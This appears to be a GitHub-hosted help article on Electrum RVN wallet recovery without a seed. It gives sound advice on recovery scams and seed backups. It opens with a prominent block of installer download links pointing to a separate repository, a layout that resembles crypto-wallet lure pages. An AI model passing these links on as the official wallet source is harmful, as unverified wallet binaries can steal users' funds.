![Electrum RVN](assets/banner-article.png)

# Electrum RVN Recovery Without the Seed

<!-- compact-download-block -->

<p align="center">What the encrypted file can still do for you</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
Without the seed or the password, a wallet file is a locked box. There is no reset, no backdoor and no service that can open it, and anyone who says otherwise is selling something. What remains is the file, your memory of the password, and whatever copies exist of either - so the honest answer is a short list of things worth trying and a clear statement of where it ends.

## The two things that can open a wallet

**The password**, which decrypts this file on this machine. If you have it, the wallet opens normally and nothing is lost.

**The seed**, which recreates the wallet anywhere with a new password. If you have it, the file's password is irrelevant - [forgot your Electrum RVN password?](https://github.com/electrum-source/passphrase-backup/blob/main/forgot-your-electrum-rvn-password.md).

If you have neither, nothing else works. The encryption is not a puzzle with a trick answer; it is designed so that the key is the only way in.

## Things that are worth trying

**Search for a copy of the seed.** Old notebooks, a safe, an envelope, a folder of papers from when you set the wallet up. People who "never wrote it down" sometimes did, once, in a place they have not looked.

**Search for a copy of the file.** A backup of your old computer, an external drive, a migration you did years ago. A file copy plus a remembered password is a wallet.

**Search for the password in your own records.** A password manager, a notebook, a pattern you reuse with variations. Test candidates calmly in the wallet rather than in a script.

**Ask yourself whether a second wallet existed.** A phone wallet, an old desktop install, a wallet created for a specific payment. Its seed or its file may be findable even if this one is not.

**Check whether the funds are really there.** If the wallet never received anything, there is nothing to recover, and an empty locked file is just an empty file.

## Things that do not work, and cost money

**"Recovery services".** A service offering to unlock a wallet file wants the file, or the seed, or a fee. Giving it the file hands over encrypted keys; giving it the seed hands over the funds.

**Brute-force tools promising results.** They are real tools with real limits: a strong password is not going to fall, and a weak one may - but the software that claims to guarantee success is usually malware.

**Seed-phrase "finders" and AI scanners.** There is no algorithm that reconstructs a lost phrase from a partial memory. Anyone who claims one is guessing with your money.

**Support accounts in your messages.** No legitimate support process asks for a seed, a file or a screen share. [How safe is Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md) lists the pattern.

## The boundary, stated plainly

If the file is intact but the password is gone and the seed is gone, the funds are not recoverable by you, by the developers, or by anyone else. That is not a policy that could be relaxed; it is the property that makes self-custody self-custody.

It is worth saying twice because the alternative belief is expensive: any service that accepts this situation and promises recovery is not solving the cryptography, it is taking the file.

## What to do with the locked file

Keep it. A locked file is not useless:

- it holds your labels and history, which a later seed restore would not bring back;
- if the seed turns up in a box in two years, the file becomes optional but the history becomes readable;
- if you eventually remember the password, everything is there.

Do not delete it to "start clean", and do not upload it anywhere.

## Preventing the next time

The two failures that produce this page are "never wrote the seed down" and "stored it digitally and lost track". Both are fixable in ten minutes at setup:

1. Write the twelve words on paper, twice, before the first coin arrives.
2. Store the copies in two places that do not share a disaster.
3. Restore once to prove the backup works, then delete the test wallet.
4. Choose a password you can reconstruct and keep it away from the seed.
5. For amounts that matter, consider a hardware wallet, where the seed is generated and held by the device - [import a hardware wallet seed into Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/import-a-hardware-wallet-seed-into-electrum-rvn.md) covers the trade.

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. The procedures that prevent this page are [backing up an Electrum RVN seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md) and [storing your Electrum RVN seed offline](https://github.com/electrum-source/passphrase-backup/blob/main/storing-your-electrum-rvn-seed-offline.md); the migration that avoids losing the file is [moving Electrum RVN to another computer](https://github.com/electrum-source/passphrase-backup/blob/main/moving-electrum-rvn-to-another-computer.md); and [Electrum RVN cold storage workflow](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md) is the setup where one lost machine is an inconvenience rather than a loss.

## FAQ

### Can the developers recover my wallet without the seed?

No. They do not hold your keys, and there is no mechanism by which they could. The encryption has no recovery path by design.

### Can a recovery service unlock my wallet file?

A service can try passwords, which you can do yourself, and asking for the file or the seed is how such services take funds. Treat the offer as the risk.

### Is there any way to recover without the password if I have the seed?

Yes. Restore from the seed into a new wallet and set a new password. Labels are lost; funds are not.

### What if I remember part of the seed?

A partial phrase cannot be restored - the checksum fails. Guessing the missing words is a lottery, and the wallet does not offer a partial restore.

### Should I keep trying passwords?

A few, calmly, in the wallet itself, is reasonable. Repeated random attempts do not damage the file but they rarely succeed, and a tool promising certain success is malware.

<!-- related-articles -->

## Related articles

- [Forgot Your Electrum RVN Password](https://github.com/electrum-source/passphrase-backup/blob/main/forgot-your-electrum-rvn-password.md)
- [How Safe Is Electrum RVN?](https://github.com/electrum-source/passphrase-backup/blob/main/how-safe-is-electrum-rvn.md)
- [Import a Hardware Wallet Seed Into Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/import-a-hardware-wallet-seed-into-electrum-rvn.md)
- [Backing Up an Electrum RVN Seed](https://github.com/electrum-source/passphrase-backup/blob/main/backing-up-an-electrum-rvn-seed.md)
